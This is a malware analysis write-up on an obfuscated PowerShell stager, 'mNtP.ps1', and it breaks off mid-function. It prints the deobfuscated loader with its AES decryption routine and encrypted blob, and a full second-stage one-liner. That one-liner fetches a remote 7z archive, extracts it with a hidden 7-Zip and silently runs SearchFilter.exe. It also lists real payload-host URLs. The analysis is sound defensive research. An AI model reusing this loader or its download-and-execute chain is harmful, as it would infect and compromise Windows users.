# mNtP.ps1

## Static Analisys
- **Target**: Microsoft Windows
- **Family**: *unknown*
- **Malware name**: *unknown*

- **Files**:
    - `mNtP.ps1`: Malware stager
    - *`secondStage`*: Second stage

- **Notes**: The analysis is incomplete due to inaccessible GitHub repository for the third stage.

### mNtP.ps1
- **SHA256**: aa22e56ad395221995d53aaf258bbd8f5a08ebc86f150088e01a38b92f70da90
- **MD5**: 4abc18de044d79e306d993ee5b1674ad

- **Language**: PowerShell script

### *secondStage*
- **Language**: PowerShell script

## Behavior Analisys
The main stager unpacks itself from the Base64 strings, and decrypts it's main payload encrypted with AES.

When the second stage is launched, the malware tries to retrieve the 7zip malicious archive from 4 sources:

- `https://rlim.com/seraswodinsx/raw`
- `https://codesandbox.io/embed/qdy6j9?view=preview&module=%2Fdart`
- `https://youtu.be/XiH4D4UguJA`
- `https://docs.google.com/document/d/19ljVCOs-lyGxXbM4V1fSI5_svRuBcfqRDBh39eQlA8w/edit?usp=sharing`

All those links, when the resources inside them are properly extracted, get the following string:

```
w5nDpMOWwqnCn3JifMKfw5fCtMOmw7DDhMKPwp7DhsKRW8OKw6DDmcOVwq3CocKqwpjClMKnw5Jvwr/DqcOGw5PCqsOAwohvw6bDo8OTw5fCpcKNwqrChsKywp3DmcKCw5/DrcKRw5PCoMODwonCjcOww5bDo8KRwp3Cm8KvwqHCucKnw4/CpMKtw63CkcK0wqDCuMKWwo/DpcK3w5nDjsKtwpHCqmHChMKy.deodorantkindredimpo
```

Further progress couldn't be made because the GitHub link for the third stager couldn't be obtained. It simply returned a broken link: `https://github.c¹¦´\d=?ql\t7Q©HXH_MbÜ¯«(:$yq¡Oµ#"H',µÉÙ:yo20IExuºD|2xVÁ£:5A`

## Advanced Behavior Analisys
***All the interpreted code refers to either the ghidra, cutter or IDA projects. Sometimes the debugger was used to help gathering functions parameters...***

My code comments notation when looking into PowerShell script:

```powershell
# Standard comment: explaining the code you see below
<# Truncate code part explaination: sometimes there may be some useless code, which i replace with this comment, explaining what the code does #>
```

My code comments notation when looking into C code:

```c
// Standard comment: explaining the code you see below
/* Truncate code part explaination: sometimes there may be some useless code, which i replace with this comment, explaining what the code does */
```

My code comments notation when looking into Assembly code:

```asm
; Standard comment: explaining the code you see in the left or below
```

### mNtP.ps1
This PowerShell script is the main malware stager. The script itself is highly obfuscated, so we first need to clean it up.
The first thing we see is that the script contains a lot of backticks. They confuse a lot of people, but the real deal here is that a backtick does nothis more than escaping the next content. We can simply replace them with nothing, and now the syntax highlight starts to help us a bit.

Next, we also see some blobs of bitwise operations being performed, such as:

```powershell
(((-bnot(-bnot((((((-bnot(-bnot(((((14332-Bxor-5719)-Band2*(14332-Band-5719))-Band((14332-Bxor-5719)-Bor2*(14332-Band-5719)))-Band(((14332-Bxor-5719)-Band2*(14332-Band-5719))-Bor((14332-Bxor-5719)-Bor2*(14332-Band-5719))))+((((14332-Bxor-5719)-Band2*(14332-Band-5719))-Band((14332-Bxor-5719)-Bor2*(14332-Band-5719)))-Bor(((14332-Bxor-5719)-Band2*(14332-Band-5719))-Bor((14332-Bxor-5719)-Bor2*(14332-Band-5719)))))))))-Band0xFFFFFFFF))))))-7613)
```

We can simply let PowerShell evaluate the result for us, and replace them.
After that we can see that the methods used by the malware are written literally using strings. Again, we can simply rewrite them correctly.

All and all, the code now should be cleaner. Now, we could start from the top, and analyze every function we encounter like this, but there might be some decoy functions there. It's worth almost every time to find the main function (or in this case the main script segment) and start analyzing from there. In this case, the main script segment is the following:

```powershell
${LFcczBIKGunhg} = <# Some data blob... #>
${xIOoasunjebDu} = ${lfccZbIkgunHg}."ToCharArray"();
[aRrAY]::Reverse(${Xiooasunjebdu});

${aURAZZdolBIkT} = vNjSUnUZESy -COOyohpDrrZtx ${XIooasunjebdu} -AVcTBpAwmDkwL ([String]::Empty);
${kWjhltmxuaxue} = ${AuRAZzdoLBIKt}."ToCharArray"();
[aRraY]::Reverse(${kWjhltmxUaxue});

${AdvsZsOUiEjPJ} = [System.Text.Encoding]::Utf8.GetString([SYSTem.cOnveRt]::"FROMbAse64StRiNG"(-join ${KwjhltmxUaxue}));
${bsqqIgCnmJjep} = ((([SYSTEM.tEXt.EnCOdiNg]::Utf8.GetString([byte[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110)))));

New-Alias -Name pWN -Value ${bsQQigcnMjjEP} -Force;
pWN ${ADVSzsoUIEJPj}
```

As you can probably see, the first variable is assigned to a very long list of bytes encoding and operations. Again, we could manually try to find out what that is, or we could let PowerShell evaluate this expression on it's own.

It's also worth noting that we shouldn't let PowerShell evaluate random stuffs, as they could detonate a payload. In this case tho, we see that the variable is later used and tranformed into a character array, so we should be safe.

Nevertheless, we should only let PowerShell evaluate those things on a virtual machine... better to be safe than sorry.

After the whole evaluation, we end up with a probably encoded string.
Then we see that this string is converted into a char array, and then reversed. The same thing happens to another variable, except that now it's assigned to the return value of the `vNjSUnUZESy` function, passing the encoded string from earlier, and an empty one. 

Let's dig into it.

#### vNjSUnUZESy
After a bit of namespace cleaning, we find ourselves into this function:

```powershell
function vNjSUnUZESy
{
    param
    (
        [string]$COoyohpdrrztx, [string]$AvcTbpAwmdkwl
    );

    ${lofbbEMxnhKjE} = [System.Convert]::FromBase64String($CoOyohpdrrZtx);
    ${vubbkbvuMypvl} = ${lofbBeMXNHKjE}[0..7];
    ${AlVTVIvgEhoos} = ${LOFBbEmXnhKjE}[8..4295];

    ${YOhBrhNlyTZvc} = zX6spLZB0YM -gdKtfQzgytgtn $AvcTBpAwmDkwl -lvWoFafrazwos ${vubbkbvuMypvl};
    ${FCsNBPPXuqzIm} = ${YOHBRhnLYTZVc}.k;
    ${oIFtvBTAKsPBx} = ${yoHbrhnlytZVc}.V;

    ${GyUcFskKPnlWb} = [System.Security.Cryptography.AES]::Create();
    ${GyucfskKpNlwb}.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    ${gYucFsKKpnLWb}.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
    
    ${gyUcFskkpnLWb}.Key = ${FCsNBPPXuqzIm};
    ${gYUCFsKkpnlWb}.IV = ${oIFtvBTAKsPBx};
    ${DcnoUSJHAKagh} = ${GYUcfsKkPnLWb}.CreateDecryptor();

    try
    {
        ${YawzexbgfKoyp} = ${dcNoUsjhaKAgH}.TransformFinalBlock(${ALvtViVGEHoos}, 0, ${aLVtViVgEHoos}.Length);
        return [System.Text.Encoding]::Utf8.GetString(${yawzexbgfKoyp})
    }
    catch
    {
        return $null
    }
};
```

We can easily figure out the parameters passed to the function as the encodedString and the empty one.

We can then see it decodes the string from Base64, and then substrings the content in two variables. The first variable is then used as a parameter for the `zX6spLZB0YM` function, alonside with the empty string.

Let's jump into the `zX6spLZB0YM` function to get a rough idea of what's going on.

#### zX6spLZB0YM

```powershell
function zX6spLZB0YM
{
    param
    (
        [string]$gdKtfQzgytgtn, [byte[]]$lvWoFafrazwos
    );

    ${FCSNBPPXUqZiM} = New-Object byte[](32);
    ${OiFtvBtaksPBx} = New-Object byte[](16);
    ${CtzqvQciVReXb} = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($gdKtfqzgytgtn, $lVwofafrAzwos, 1000, [sySTEm.sEcURItY.CRYptOGRapHY.hAsHAlGoRItHmnAme]::ShA256);

    ${FcsnBPPXuqZim} = ${CTzQvqCIvrExB}.GetBytes(32);
    ${OiFtVbtAkspBx} = ${cTZQVqcIvREXB}.GetBytes(16);

    return @{ k = ${fCsNbpPXUQzim}; V = ${oiFtVbTAKSPbx} }
};
```

The function itself is pretty straightforward: it creates two arrays, and generate some bytes that will then be returned.

To get a better idea of the parameters passed to the `Rfc2898DeriveBytes` contructor, we can look at the documentation:

```
Rfc2898DeriveBytes(String, Byte[], Int32, HashAlgorithmName)

Initializes a new instance of the Rfc2898DeriveBytes class using the specified password, salt, number of iterations and the hash algorithm name to derive the key.
```

We can see now that the created object parameters are a password, salt, number of rounds, and Sha256 algorithm.

From the return statement, we can deduct that the function returns a key, and a vector.

It's easy to see now what the function does:

```powershell
function getKeyAndVector
{
    param
    (
        [string]$password, [byte[]]$salt
    );

    ${key} = New-Object byte[](32);
    ${vector} = New-Object byte[](16);
    
    ${rfc2898} = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 1000, [System.Security.Cryptography.HashAlgorithmName]::Sha256);
    
    ${key} = ${rfc2898}.GetBytes(32);
    ${vector} = ${rfc2898}.GetBytes(16);

    return @{ k = ${key}; V = ${vector} }
};
```

#### Back to vNjSUnUZESy
Now that we interpreted the other function, we can clearly see that it's using the empty string as a password, and the first 8 characters as the salt for the `getKeyAndVector` function. Then, a Key and IV pair are returned, and used to initialyze other two variables.

Then we can see that an AES crypto provider is created, and the second string block is decoded.

Then we see that if the block was successfully decoded, it returns the stringlified version, else null.

This could very well be the malware second stage string.

All and all, the function looks like the following:

```powershell
function getSecondStageCommands
{
    param
    (
        [string]$encodedStringParam, [string]$emptyStringParam
    );

    ${decodedBase64String} = [System.Convert]::FromBase64String($encodedStringParam);
    ${extractedSalt} = ${decodedBase64String}[0..7];
    ${aesEncodedBlock} = ${decodedBase64String}[8..4295];

    ${keyIV_Pair} = getKeyAndVector -password $emptyStringParam -salt ${extractedSalt};
    ${key} = ${keyIV_Pair}.k;
    ${vector} = ${keyIV_Pair}.V;

    ${aesCryptoProvider} = [System.Security.Cryptography.AES]::Create();
    ${aesCryptoProvider}.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    ${aesCryptoProvider}.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
    
    ${aesCryptoProvider}.Key = ${key};
    ${aesCryptoProvider}.IV = ${vector};
    ${aesDecryptor} = ${aesCryptoProvider}.CreateDecryptor();

    try
    {
        ${aesDecodedBlock} = ${aesDecryptor}.TransformFinalBlock(${aesEncodedBlock}, 0, ${aesEncodedBlock}.Length);
        return [System.Text.Encoding]::Utf8.GetString(${aesDecodedBlock})
    }
    catch
    {
        return $null
    }
};
```

#### Back to the main function
Now we can go back to the main script, and actually make more sense. We see that the string returned from the function is then reversed, and then decoded from Base64 into Utf8.

The we see that another string in decoded, and this time is `Invoke-Expression`.
Then an alias of `Invoke-Expression -Force` is created, and then executes the seocnd stage string.

All and all, the `mNtP.ps1` file looks like this:

```powershell
function getKeyAndVector
{
    param
    (
        [string]$password, [byte[]]$salt
    );

    ${key} = New-Object byte[](32);
    ${vector} = New-Object byte[](16);
    
    ${rfc2898} = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 1000, [System.Security.Cryptography.HashAlgorithmName]::Sha256);
    
    ${key} = ${rfc2898}.GetBytes(32);
    ${vector} = ${rfc2898}.GetBytes(16);

    return @{ k = ${key}; V = ${vector} }
};

function getSecondStageCommands
{
    param
    (
        [string]$encodedStringParam, [string]$emptyStringParam
    );

    ${decodedBase64String} = [System.Convert]::FromBase64String($encodedStringParam);
    ${extractedSalt} = ${decodedBase64String}[0..7];
    ${aesEncodedBlock} = ${decodedBase64String}[8..4295];

    ${keyIV_Pair} = getKeyAndVector -password $emptyStringParam -salt ${extractedSalt};
    ${key} = ${keyIV_Pair}.k;
    ${vector} = ${keyIV_Pair}.V;

    ${aesCryptoProvider} = [System.Security.Cryptography.AES]::Create();
    ${aesCryptoProvider}.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    ${aesCryptoProvider}.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
    
    ${aesCryptoProvider}.Key = ${key};
    ${aesCryptoProvider}.IV = ${vector};
    ${aesDecryptor} = ${aesCryptoProvider}.CreateDecryptor();

    try
    {
        ${aesDecodedBlock} = ${aesDecryptor}.TransformFinalBlock(${aesEncodedBlock}, 0, ${aesEncodedBlock}.Length);
        return [System.Text.Encoding]::Utf8.GetString(${aesDecodedBlock})
    }
    catch
    {
        return $null
    }
};

${encodedString} = "kJW/KVUjYJht5ICJAIJWgRC+9JA44dQ7cbtJkk0OoMvY+MVGApD2wdsTF9FcMmTNDC+I3B12qbJ3VUwQlAvpGc1l3lyIAGWTgoxcq61cvmtcj2ie8vuIucEySlAb5/ycSvoCTMZVfOV3X0CUClBf2AOQr1LVZl47KHklcS0xxQkNrdvVtk1ULYa2DJbL5KU5qtnd7i7EMid/dLRsx8beHkZaSMcx3sgGMgAkFzSag7ZX8dIdfuTRuEbww7EYjCx9bPT6+hcPyIdZwDHw1PTJ32rDUj4vJSWtcVnrr6OjA7E4/Qtw2BZt6XR/Bzch1qeWWcEea3ynYFZOmTR+HzHqz3K3lZsJgr06PXGUzJyF5bjvCOiuws9BP8YbfwSfN8fRwZLxFO+0fCqTa8VI23v8KE5wZ5VbqxELudQeroDu5UD7rSZpKhEchdcBJ7NUM2a/dBWS7sl1IQzyOBfhHSFD0ba0qsyC5q28E7h8R1mSO0BKPyE/xAx3cLEr8kQwYYN2LjNBrXhiBlWe1ux7QxAbjcJmGnFt/saZ3XBBff3aGja3h9BEanIsK1+6e0dqmvO3XvHQOYD0bWnskyJ25UplpHLRCxdT57M6mxnJI5sbu0Ms5CDmjCrIrkg40CRLStXkycDyo3wp4EzRKU1+aO/6aUlzOvQ/CM6zk/NuDPPt3WEcmoE7LF6eAAJjx5Pa2r+qECh1XUwQXm8eqBuvIXlIposHGtYjOTPK0EqVhJ/yaWiSwd5g33iXSek4UBaCcj8vjJ09nBiBscvGFKIXwdW2xsGtB4MQ5/RY1cwxipE+CyC+VpHmX5wMUgcdjc2eL2V33V/8slw3rBxyfKLfO+zDYhcwAI3kr0XgAURL9PdmFPWxikq3NagNV8PemIenOvvxCARqJtp31Sna4M0g6BhRHgcQh2qrZKc+KyJTrFFCprHNziQ+g/2lJZQAolJp885rfBk4SQaISOgkCTIsQ4k/EAJ63FHQGRrJ6JJdVNU6af1VRwQBudy1RosWf1NVlLgJk5YmiJ72sb15egUC4kkkmwM5YG7VKX9BT0GkqaANa8FUnMqFp4HsGyT0MpW7zcLcSrk1JDx0CYRN/YvOHrd2BYvoBTQzp8KNbRKrpKuiswPqmxyZGLEY4UFHWlmH9i7lz0iomhyhMZG9yo9BeNNJsCY1hT00xPAnOUJxQgicnD+wbi/A/0/HcrcbJFPOoHGeRiVyMHnCiHXzR1eJ+Ly10HvutdDmjgnRcrLxdLgAHjcR9g4IUYDOtZVZbUhMxezpwWqWu9m4WN+0tK9nDs94OSdZeoFBXRvkwE4EoAoL5zK+ZQwTAMbBlHpXeoZs9BcyFAbpQ7pJTB4jv2t1DPE0gJLi5eHKmsJPYeuYOmuacMaPMffRae192oLV+HIv6EGE0fno+zanlHDgg/+qWY32GsX9njyiiLK3uTO3PTxrDr1S49AELfS0xLot7XB0ppmX9hKbnxSkolKyzVSRx5toXNUtbK9eRSf/qjtncSCkNK+TmVM9IIX9/s06m0wIvxBEXyoEOli153bQ6dBh0MKpAZMJfC7R4Sx+h3l9ErFr5/3KMEZ/1ziLL76IbIsXqGKSUG6o0tB2L8hqL9IQ2qy4K+LpJFobXLQf0fnL7cCrwfWSK7O2qDlS7WZeqlC2t7cF5kKk2qKdGZWkgSV3vscIhdg1NdtxC1PMpeQYrCikNoYtMiBr3BfL/s4eYky8ExmXa8M6OCMxch0irb5STYdgJM4f/G4J8XhscwXb5XsbfF66wJzSDgKrt/xzBohSHUD8ZvpiBnbivaxitdxhX1082LjN18xCBYuZPtqDLbCBBSO7wOl5Bwo6EpizBU6hdRXgT+dh3fKp8u5cFYMrv8UqRIzh27rqDuN+E1yJNKQzaJ8FYpinydc0zpA1nsq0Y4+81Jk+zgcji91cYaGadT+CA/t4oEJIqz+eRgeZASYDds+wZcRb0t/ldVghJbsxe4TCpAbb/woDXMd/WRipr2Al5KqV7zts42wOYVnqid8i9Pj6HmkxZt51VOhoMjtgviPhNjoNtJTe6qF2NwgdAHOw4b2J+R0IJp/dj2NNS1W/KYZacQicHMWqkI7PwbtcKEdCerMCEA5TGzhwAa8sKHh7sNxHG21RgTzO5o5kkK/msiCfmTmrh6wbfj7W3RAfOhN7B2nY8n+2OcOidjD22UuEv3/LTFreOr079GPapIvo1u7sv8QYRGXYrLpec6HrE0XwssOd0oFVQQ8biHNyO/d7lz/jWyowVP6sEe/Pnwo+fnhcSKkix1enj0WnXVapKMdz8RxajgWl6m4f7RPYRzysDqwqHerQEzHNGFXXRUEgltVkMx67afrdspXm0Oh25xVx3zIuQEXAQCkhkKsMUGJLqdDNwtaY6CeZ+ZaDobSdIYMehYdzaAT/1Yxy4XL7P/JK3oSz1HGlFyqYtnuZDWOOzVJaL/0sLc7HGhrwvD6m+mM14ssXmsQayv4GIGgaRCMi/DgLVyVwLOyET7eA1uGCuYbVPxWJIC2934s68cUF5KmJ1uZpNXmvkmGt/6DIwJygqqTDvAcVPycTH8I4fgiJZDYxczW87sSMG04BZoQciS2NP3hLzTUxZI35LCajDAj0HA4eG7Fd+xQHg7SkLW7SbTb9IW3Uz4/lMz6KgC7/2hIDztf49wCBT151uQN4qI+tdfWWbGq8Tv5px4KkFdpqpHmH9VRhhmV04PWf/ystX8HgzdGls7esbyZZNRiXqQQ+u+aGHaFSQmJqJtpAmrfxjT7iqxmNky6jiVrEquEBo2B7RQThK2Y89SGf6bQfWpGk6jL80ayahv4tISPm9Lh62f3YSaInlH9ioexwrCzftVLOmzE1E43zxdvJs+78BPAKG5zM/oEYDF3BrVt61k9k/dtkzjBAsAaKjK3lSUVgsAkLuvj7tYg3pjAxhIYC0UPOCHT24bAdC7nUHmTtonNy0SWfwpoyGIbOley4b05TxOvVsz/mJuKMKbeEwVVZKVppDReHE79KEf+m5MRBrVbu+LW13+yd03IlzZse5wLNAeRNzjAjx4z9KHCd8EhmOGFfLsPP9ypQ3C2hRLvijbjVDtoMf/ivo5lobUbi4x17xID3ZNhsOu/D2d/G+Ce6di71LSY5SILPKzb83qVDOL+Tf/dUo97NjHFrRy0G8oQiKD9EGnkDKRuop/iVZJfwCbeYm1+d2fDF4VPIdAuZIvQv/NOfpuzVAmNaHV+xcNYDfCF/llavbvYcJXfPmaJjysetPiVkyCcUI3XpMQ54XBwc1lwhLlbJFdSY8WOZfd3GvLE7YSJ4sNsptB+eKGRd0iWn1nu+vDdRvBw6JWNxOtzE8XMty4tOFFfn/0zWjCYD8TpCgkcjsWTVUEhDeEuVCO4bcok1paOVgm7K1bOiEVNcI5rYyDORG+qqGbc+4axkce+7hyO7psz5PQ2o3p+BO0rDducLvOVhfJKo0kPnKBlhS/uAWu4cFnnKlNp2nr/7otkWZ+1HjP/UkGzzpmGRWVvLAyr1PTId68VO6cxhfjbo/y5pCcMmlHN65Lv2GvFk7v0EViNl+5M6TpabYvHp5oJGdtWuyGPjbv//IFSFLajdGiO/BlgWb4mLOLCtj9ECoYAPghTGQ9GbsiqcqdLZWB1UvBrhjlubmcdagas/J4lutVD095lfmJo8semrAFbzdmHjev+wUvlKN/ipNgQZ21vUjrrHCjSyCAe8gpEcUUDh3lUf5yH+Z7dyZ7I3vvPeuAvwfA0tSswXR9txPe4gfxfT9LEZGIqKe6l/aLgnMvoNLM319hrXRYrc6TOOQu3i9xGJ9TsmSi/thECim58dS1nNhdNEuaMrCwNy1B/NFzP20HEwTUeaZInT7A00T8JotZWsprJlUlQW1tWnghlZ+KZCj4n3jv/10lvANbQSfgRA4DX56MAhBm2WpOKZZ5ML6YdcAYPk95fACO5Ed03uYJLVZTfLwtWm4vQ07J2aSowZ5Z3YAyF6ErLrV37pdt5QeAn0BRvc2VOMmyKxraaoUCll++798Xl9xaCg2+lzNWRoskedknXb1BcILdI7s7WYA09tgU0jJpOC7k6bjomi8h+S2nfCBzouInfPgD1CoC9x61wnfKCsfShYk8YrzIjZTYzrtapAufWpl4u3zQuIALfa0xa8KPt1DDH4CppwXLutxGls3g1SvwYGX4Scf+lB3w4ApkIRx2MZZLhK6AXtaJsRjrunfn6XiqBhwhWSV+/8xmKyontvttSl3xiUkUTKVBw+G33N3+BxjgcSLMApccl8MiDo8xn5aqIBFPDXevABor6UTkeMRIGb97m56aFP787x09NDOHzmQLsYI5QkGd8/3fgE2hcsBTSZOjx+o4OC1vaJMAxSjJgdLoQwEzMl+DcRYr1qYU9z/oG7lfQTBO6ETIyoXD8U44jEiwlI5eshJ5bFk0Yb8H8WZIaENPdgowidE70lWCKCc0LVQfQeHxZDsTwfL8unZDTtiANOOjHBOJCDZxNrgB0su5fcmOPRtnz/z1tOgw9uxQJ4Xx3d5rp2G7B2Uj1v0vnxKRNKc0hsdwQvwscEa00eynDeyuykkmjA44/gOeoWpoYTQRa5uzZCc/GLqmhC4wFzakeX1R/sfI5sF6GSyxdwXRy/im0wkvgoBxvw6+4XHzyg/uQiNDQBBNj7yQn5zRKU3A+eAVXZZmUL96G0lme2t6NQXpjkcSwRq5H2SiP1XCL1N08Dn5WXLmEjXcjl1gfCiFxG3EOvELH7quAXEIZgqc835d+7YIj6khbcU48d7ZIikkooT8dIz/ll8RLoaQTmae6OjFhCZPb+8CqyAMnnw+Ng6xkrjgTgJ1UIvEFSAbgHhLd5BTC1HDQIC/5LUyBFBZ/U5SzWXak7sw/vi3/muIXLA3Xsv55072vS+5WP2C5NRkoa/K+j4XQ/iLq2kp1FcL3q53MrLToKd1uHjSCoiZufOelfL70PYpB9xv8WcXUkQA4Uv8c8AB/WpmaLjXLpkNCIL7CxTZFZivjLapbbSHQhr7TSzHjyySYiU+p3PbbaYWlgzDpnkKr5j7UXU7RMEGbkDVvliBjPGUu1HZOd5Z54In75F71YHXacbaFx4NhCDPtppWcGYQIDW2USqPSiqSLCFHm2/2D5LbM4eS76NE/2vRNbhGTe2RKggK6PmD30OFypeJxuOpg4xduvVIuok2Sm5R3+CI4hDr2IZ4wnN9YzGSdgQJVpWnhBE9FFQbN3iqDCBY1lxsPKq1SrBh4gaurJv97LezMuVie+87E7NHFTVt1LuuBBjmuWohRPdnQEqo7XHSMvhggelaT3knzH976ncfbOOLIqLcmm1u4kitYcw0SvMiYSoMduvFVbrt7pWyZQsKveTpaqvYIJAFp7vXOu49vTobXiyIYfCtVm+qcNK6lJLDNBWawGXUwPtwWgQTaBPnEm4uEqbyLTF+JoCEyPtGd3VixCT96MtlqTfj3seMUGlIgYxgo45vSHSttSXxVjQFRtzI1OV0hYCJTMsaXVoBhTKwrGTGSe5w1n1FqHfWgQVe84MfmaJmZpucu3h219+4Ypk1EgNSbX63DknvMqJlm6mGWb5YcWlII/79kE7vpUD4tLyvufUwHIikQFO4mbpxApFr2HlzoaIMLaUnBGTEKGeXS/C9ppx5B5/ydYnKyxp1vpBo3ryexc2ryuSYZTkpXPRSWtTRw3LqXY+0eW/7eGA7PuwSYtzK7+";
${encodedCharArray} = ${encodedString}.ToCharArray();
[Array]::Reverse(${encodedCharArray});

${base64ReversedSecondStage} = getSecondStageCommands -encodedStringParam ${encodedCharArray} -emptyStringPar ([String]::Empty);
${base64SecondStage} = ${base64ReversedSecondStage}.ToCharArray();
[Array]::Reverse(${base64SecondStage});

${secondStageString} = [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String(-join ${base64SecondStage}));

# Invoke-Expression
${invokeExpressionString} = ((([System.Text.Encoding]::Utf8.GetString([byte[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110)))));

New-Alias -Name pWN -Value ${invokeExpressionString} -Force;
pWN ${secondStageString}
```

Summarizing, this first stager executes the following command: 

```function rl {try {p "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==" -if $true}catch {l}};function l {try {p "wr3DqMK3w5vDp2fCl2XCoMOcw53ClsOSw5vDosK5w5bCssOjwqLClsOXZcKiw5rDm8KWw4PCqcOlwrnDrXnDlcKtbMOewp/CosOkwrbCocORw5/DqsK+w5nCusKRw6HCnMOMwqvCqcOSwrZWwpHDgMOYwrbDpsK3" -io $true}catch {x}};function x {try {p "wr3DqMK3w5vDp2fCl2XCtsOcw67CpcOUwqjDlsK6wqPCm8OUwrxhwqxqwpLDlMOue8Kg" -io $true} catch {o}};function o {try {p "wr3DqMK3w5vDp2fCl2XCocOcw5zCpMKNw6HDo8OEw5vCr8OQwqLCkMOXwqNsw5HDqMKUw5TDp8OZw4PDqHLDj8KjXsKhwqLCp8ODwrzCgMOSwqfDoMOOwrvCu8ODw5Z6wpzCjG7Dk8OMesKUw5nDp8OLw4bCuMKtw5fCk8OZwojCgcKvw6FkwpjDn8OFw4HCtXvDosKjwpLDjMKfwrHCrMOuwqTDj8K3w6fCvcOVwrXDlMOiwpQ=" -io $true}catch {Start-Sleep -Seconds 20;rl}};function p {param ([string]$e,[switch]$io = $false,[switch]$if = $false)if (-not $e) { return }try {if($io){$dd = d -mm $e -k $prooc;$r = Invoke-RestMethod -Uri $dd -Method Get;$c = $r | Out-String;$rp = "([a-zA-Z0-9+/=]{50,})\.deodorantkindredimpo";$m = [regex]::Match($c, $rp);if (!$m.Success -or !$m.Groups[1].Value) {throw}$dl = d -mm $m.Groups[1].Value -k $proc}if($if) {$d = d -mm $e -k $prooc;$r = Invoke-RestMethod -Uri $d;if ($r) {$dl = d -mm $r -k $proc}}$g = [System.Guid]::NewGuid().ToString();$t = [System.IO.Path]::GetTempPath();$f = Join-Path $t ($g + ".7z");$ex = Join-Path $t ([System.Guid]::NewGuid().ToString());$c = New-Object System.Net.WebClient;$b = $c.DownloadData($dl);if ($b.Length -gt 0) {[System.IO.File]::WriteAllBytes($f, $b);e -a $f -o $ex;$exF = Join-Path $ex "SearchFilter.exe";if (Test-Path $exF) {Start-Process -FilePath $exF -WindowStyle Hidden};if (Test-Path $f) {Remove-Item $f}}}catch {throw}}$prooc = "UtCkt-h6=my1_zt";function d {param ([string]$mm,[string]$k)try {$b = [System.Convert]::FromBase64String($mm);$s = [System.Text.Encoding]::UTF8.GetString($b);$d = New-Object char[] $s.Length;for ($i = 0; $i -lt $s.Length; $i++) {$c = $s[$i];$p = $k[$i % $k.Length];$d[$i] = [char]($c - $p)}return -join $d}catch {throw}}$proc = "qpb9,83M8n@~{ba;W`$,}";function v {param ([string]$i)try {$b = [System.Convert]::FromBase64String($i);$s = [System.Text.Encoding]::UTF8.GetString($b);$c = $s -split ' ';$r = "";foreach ($x in $c) {$r += [char][int]$x}return $r} catch {throw}};function e {param ([string]$a,[string]$o)try{$s = "MTA0IDgyIDUxIDk0IDM4IDk4IDUwIDM3IDY1IDU3IDMzIDEwMyA3NSA0MiA1NCA3NiAxMTMgODAgNTUgMTE2IDM2IDc4IDExMiA4Nw==";$p = v -i $s;$z = "C:\ProgramData\sevenZip\7z.exe";$arg = "x `"$a`" -o`"$o`" -p$p -y";Start-Process -FilePath $z -ArgumentList $arg -WindowStyle Hidden -Wait}catch {throw}}; $d = "C:\ProgramData\sevenZip"; if (-not (Test-Path "$d\7z.exe")) { New-Item -ItemType Directory -Path $d -Force | Out-Null; $u = "https://www.7-zip.org/a/7zr.exe"; $o = Join-Path -Path $d -ChildPath "7z.exe"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, $o); $wc.Dispose(); Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue; Set-ItemProperty -Path $d -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue }; rl```

We can now take a look at the second stage.

### *secondStage*
Let's not try to understand what the second stage does. After cleaning the file up a bit, we can look into the main script:

```powershell
$prooc = "UtCkt-h6=my1_zt";

$proc = "qpb9,83M8n@~{ba;
W`$,}";

$d = "C:\ProgramData\sevenZip";

if (-not (Test-Path "$d\7z.exe"))
{
    New-Item -ItemType Directory -Path $d -Force | Out-Null;
    $u = "https://www.7-zip.org/a/7zr.exe";
    $o = Join-Path -Path $d -ChildPath "7z.exe";

    $wc = New-Object System.Net.WebClient;
    $wc.DownloadFile($u, $o);
    $wc.Dispose();

    Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue;
    Set-ItemProperty -Path $d -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
};

rl
```

We can see that it defines some variables, and checks if the `C:\ProgramData\sevenZip\7z.exe` file exists. If it doesn't, it downloads the 7zip executable and places it under that directory.

Then it sets the file and directory attribute to hidden and system, and in case of errors, to continue the program execution.

Then the rl function is called.

#### rl
```powershell
function rl
{
    try
    {
        p "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==" -if $true
    }
    catch
    {
        l
    }
};
```

This function is actually really short, and all it does is calling the `p` function, and if case of errors the `l` one.

Let's see what the `p` function does.

#### p

```powershell
function p
{
    param
    (
        [string]$e, [switch]$io = $false, [switch]$if = $false
    )
    
    if (-not $e)
    {
        return
    }

    try
    {
        if ($io)
        {
            $dd = d -mm $e -k $prooc;
            $r = Invoke-RestMethod -Uri $dd -Method Get;
            $c = $r | Out-String;

            $rp = "([a-zA-Z0-9+/=]{50,})\.deodorantkindredimpo";
            $m = [regex]::Match($c, $rp);

            if (!$m.Success -or !$m.Groups[1].Value)
            {
                throw
            }
            
            $dl = d -mm $m.Groups[1].Value -k $proc
        }
        
        if ($if)
        {
            $7zPath = d -mm $e -k $prooc;
            $r = Invoke-RestMethod -Uri $7zPath;

            if ($r)
            {
                $dl = d -mm $r -k $proc
            }
        }
        
        $g = [System.Guid]::NewGuid().ToString();
        $t = [System.IO.Path]::GetTempPath();
        $f = Join-Path $t ($g + ".7z");

